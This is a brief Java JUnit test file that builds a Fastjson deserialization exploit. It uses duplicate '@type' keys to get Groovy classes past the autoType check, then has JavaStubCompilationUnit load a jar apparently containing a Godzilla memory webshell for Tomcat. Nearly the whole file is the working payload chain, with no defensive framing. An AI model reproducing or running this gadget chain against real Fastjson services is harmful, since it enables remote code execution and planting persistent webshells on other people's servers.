import com.alibaba.fastjson.JSONObject;
import org.junit.jupiter.api.Test;

/**
 * @author ReaJason
 * @since 2025/12/6
 */
class FastjsonServletTest {
    @Test
    void test() {
        String json = "{\n" +
                "  \"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "  \"unit\":{\n" +
                "  }\n" +
                "}";

        try {
            JSONObject.parse(json);
        } catch (Exception e) {
            //e.printStackTrace();
        }
        String data = "{\n" +
                "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "  \"config\":{\n" +
                "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "    \"classpathList\":[\"file:/Users/reajason/Downloads/TomcatGodzillaMemShell.jar\"]\n" +
                "  },\n" +
                "  \"gcl\":null,\n" +
                "  \"destDir\": \"/tmp\"\n" +
                "}";
//        JSONObject.parse(data);
    }
}